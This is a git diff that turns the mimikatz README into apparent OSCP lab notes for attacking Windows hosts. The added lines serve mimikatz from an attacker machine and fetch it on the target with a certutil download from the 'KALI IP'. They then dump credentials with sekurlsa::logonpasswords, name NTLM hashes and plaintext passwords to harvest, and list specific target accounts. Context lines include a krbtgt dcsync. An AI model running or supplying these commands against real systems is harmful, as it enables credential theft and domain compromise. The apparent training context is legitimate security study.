@@ -40,8 +40,28 @@ But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informati
 
 If you don't want to build it, binaries are availables on https://github.com/gentilkiwi/mimikatz/releases
 
+```
+cd ~/Desktop/Tools/Windows/mimikatz && python -m http.server 80
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/mimikatz64.exe mimikatz.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
 
 ## Quick usage
+
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+
+---
+
 ```
 log
 privilege::debug
@@ -91,46 +111,53 @@ token::revert
 lsadump::dcsync /user:domain\krbtgt /domain:lab.local
 ```
 
-## Build
-`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
-* for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - http://www.microsoft.com/download/details.aspx?id=44914)
-* _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800_
+---
 
-`mimikatz` uses `SVN` for source control, but is now available with `GIT` too!
-You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)
+Inside Mimikatz, run:
 
-### Synchronize!
-* GIT URL is  : https://github.com/gentilkiwi/mimikatz.git
-* SVN URL is  : https://github.com/gentilkiwi/mimikatz/trunk
-* ZIP file is : https://github.com/gentilkiwi/mimikatz/archive/master.zip
+```
+privilege::debug
+```
 
-### Build the solution
-* After opening the solution, `Build` / `Build Solution` (you can change architecture)
-* `mimikatz` is now built and ready to be used! (`Win32` / `x64` even `ARM64` if you're lucky)
-  * you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.
+You ideally want:
 
-### ddk2003
-With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)
+```
+Privilege '20' OK
+```
 
-For this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.
+Then:
 
-Follow instructions:
-* https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme
-* _https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader_
+```
+sekurlsa::logonpasswords
+```
 
-## Continuous Integration
-`mimikatz` project is available on AppVeyor - https://ci.appveyor.com/project/gentilkiwi/mimikatz
+Look for these fields:
 
-Its status is: ![AppVeyor CI status](https://ci.appveyor.com/api/projects/status/github/gentilkiwi/mimikatz?svg=true&retina=true)
+```
+Authentication Id
+Session
+User Name
+Domain
+NTLM
+SHA1
+Password
+```
 
-## Licence
-CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/
+Pay particular attention to:
 
-`mimikatz` needs coffee to be developed:
-* PayPal: https://www.paypal.me/delpy/
+- Accounts other than `eric.wallows`.
+    
+- Accounts belonging to `SECURA`.
+    
+- Any administrator or service accounts.
+    
+- NTLM hashes or plaintext passwords, if available.
+    
 
-## Author
-* Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
-* DCSync and DCShadow functions in `lsadump` module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( http://www.mysmartlogon.com )
+Don't be surprised if the password field is empty. Modern Windows configurations often prevent plaintext passwords from being recoverable.
 
-This is a **personal** development, please respect its philosophy and don't use it for bad things!
+If cant type, 
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
